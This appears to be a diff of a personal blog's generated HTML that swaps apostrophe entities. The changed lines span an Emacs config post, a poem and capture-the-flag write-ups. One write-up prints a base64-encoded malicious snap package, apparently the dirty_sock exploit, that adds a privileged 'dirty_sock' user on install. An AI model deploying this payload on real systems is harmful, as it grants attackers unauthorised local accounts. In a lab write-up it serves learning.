         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:title&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:body&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-grouped-mail-notification-formatter&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-grouped-mail-notification-formatter&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;And That’s it .&lt;/p&gt;
 &lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
@@ -1005,7 +1005,7 @@ i started wondering
 what life had planned for me.
 i began thinking
 but most of all, my love,
-i dream&apos;t of life with you.
+i dream't of life with you.
 Every morning i wake up 
 to your smile 
 i cannot help but wish 
@@ -1152,7 +1152,7 @@ PORT   STATE SERVICE VERSION
   &lt;/li&gt;
   &lt;li&gt;i decoded the base64 and wrote it to a file using python
     &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''
 aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
 /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
 ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
@@ -1168,9 +1168,9 @@ rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
 AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
 XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
 RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
-AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&apos;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;==&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'=='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crafted.snap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;wb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crafted.snap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
@@ -1202,7 +1202,7 @@ We can see there’s 3 ports open.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic26.png&quot; alt=&quot;Static_Contact&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;We can see a note from the site owner?&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you&apos;ll be able to have access to our MatterMost server
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;so let’s look at the helpdisk at helpdesk.delivery.htb&lt;/p&gt;
 
@@ -1225,7 +1225,7 @@ Hmmm there must be somewhere around it . let’s check the open ticket thing .&l
 
 &lt;p&gt;We Get Support ticket request created with a ticket id and an email ?
 At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you&apos;ll be able to have access to our MatterMost server
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Now before we go and create an account at mattermost let’s check out ticket status.&lt;/p&gt;
 
